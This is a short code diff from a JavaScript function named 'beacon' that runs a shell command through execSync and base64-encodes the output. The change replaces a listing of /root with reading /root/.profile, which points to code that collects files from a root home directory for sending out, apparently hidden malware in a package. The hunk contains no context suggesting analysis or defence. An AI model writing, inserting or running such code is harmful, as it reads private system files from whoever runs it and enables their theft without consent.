@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'ls -la /root',
+  'cat /root/.profile',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
